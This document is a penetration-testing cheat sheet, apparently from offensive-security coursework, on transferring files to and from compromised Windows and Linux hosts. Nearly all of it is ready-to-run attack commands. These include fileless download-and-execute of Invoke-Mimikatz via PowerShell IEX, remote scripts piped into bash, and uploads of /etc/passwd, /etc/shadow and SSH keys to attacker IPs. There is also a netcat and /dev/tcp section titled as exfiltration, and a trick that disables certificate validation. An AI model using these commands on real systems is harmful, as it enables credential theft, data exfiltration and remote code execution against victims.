
| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell             |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

# Windows

## Download

### Base64

- maximum string length of 8,191 characters

```bash
# from linux
cat id_rsa |base64 -w 0;echo
# to window
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR......S0tLQo="))

# Verification
# Linux
md5sum id_rsa
# Windows
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### PowerShell

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### Fileless method

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### Errors Bypass

```powershell
# Internet Explorer first-launch
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# SSL/TLS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

```bash
# from linux
sudo impacket-smbserver share -smb2support /tmp/smbshare
# with creds
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test


# from window
copy \\192.168.220.133\share\nc.exe

# if copy doesn't work, mount server
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP

```bash
# from linux
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

# download from window
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Upload

### Base64

```powershell
# from window
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# verify
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

# to linux
echo I...0DQo= | base64 -d > hosts
md5sum hosts
```

```powershell
# from window
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.14.226:8000/ -Method POST -Body $b64

# to linux
nc -lvnp 8000
# decode
echo <base64> | base64 -d -w 0 > hosts
```

### PowerShell

[GitHub - uploadserver](https://github.com/Densaugeo/uploadserver)

```powershell
# host server on linux
uv run --with uploadserver python -m uploadserver

# upload from windows (internet require to install script)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.226:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### SMB

- Can use when SMB is not allowed for outbound connections
- An alternative is to run SMB over HTTP with `WebDav`

```bash
# setting up dav server on linux
uvx --from wsgidav --with cheroot wsgidav --host 0.0.0.0 --port 80 --root "$(pwd)" --auth anonymous

# from window
# default dav root
dir \\192.168.49.128\DavWWWRoot
# file upload
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP

```bash
# from linux
sudo python3 -m pyftpdlib --port 21 --write

# from window
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Create a command file for ftp client

```bash
cat > ftpcommand.txt << 'EOF'
echo open 192.168.49.128
echo USER anonymous
echo binary
echo PUT c:\windows\system32\drivers\etc\hosts
echo bye
EOF

# connect
ftp -v -n -s:ftpcommand.txt
```

# Linux

## Download

### Base64

```bash
# encode
cat id_rsa |base64 -w 0;echo

# decode
echo -n 'LS0....tLS==' | base64 -d > id_rsa

# verify
md5sum id_rsa
```

### Wget & Curl

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### Fileless Method

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Bash (/dev/tcp)

```bash
# Connect to the Target Webserver
exec 3<>/dev/tcp/10.10.10.32/80
# HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
# print
cat <&3
```

## Upload

### Web (443)

```bash
# create cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# create a new dir
mkdir https && cd https
uv run --with uploadserver python -m uploadserver 443 --server-certificate ../server.pem

# Upload files
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Web Servers

```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

## SSH (SCP)

```bash
sudo systemctl enable ssh && sudo systemctl start ssh

# download
scp plaintext@192.168.49.128:/root/myroot.txt .
# upload
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Transfer with Code

## Python

### Upload

```bash
# hosting server
uv run --with uploadserver python -m uploadserver
# upload
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Download

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP

### Download

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Pipe to bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby

### Download

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl

### Download

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

### Download

```javascript
// create wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

// download using the script
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

### Download

```bash
# create wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# download using the script
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

# Netcat

# Netcat / Ncat File Transfer

## 1. Victim Listens → Attacker Sends
> Use when inbound connections to the victim are allowed.

### Victim (Original Netcat)
```bash
nc -l -p 8000 > file
```

### Victim (Ncat)
```bash
ncat -l -p 8000 --recv-only > file
```

### Attacker (Original Netcat)
```bash
nc -q 0 <victim-ip> 8000 < file
```

### Attacker (Ncat)
```bash
ncat --send-only <victim-ip> 8000 < file
```

---

## 2. Attacker Listens → Victim Downloads
> Use when victim cannot receive inbound connections (firewall/NAT).

### Attacker (Original Netcat)
```bash
sudo nc -l -p 443 -q 0 < file
```

### Attacker (Ncat)
```bash
sudo ncat -l -p 443 --send-only < file
```

### Victim (Original Netcat)
```bash
nc <attacker-ip> 443 > file
```

### Victim (Ncat)
```bash
ncat <attacker-ip> 443 --recv-only > file
```

---

## 3. No Netcat on Victim (`/dev/tcp`)
> Bash-only feature.

### Attacker
```bash
sudo nc -l -p 443 -q 0 < file
# or
sudo ncat -l -p 443 --send-only < file
```

### Victim
```bash
cat < /dev/tcp/<attacker-ip>/443 > file
```

---

## 4. Exfiltrate Files (Victim → Attacker)

### Attacker
```bash
nc -l -p 443 > secret.txt
```

### Victim
```bash
nc <attacker-ip> 443 < secret.txt
```
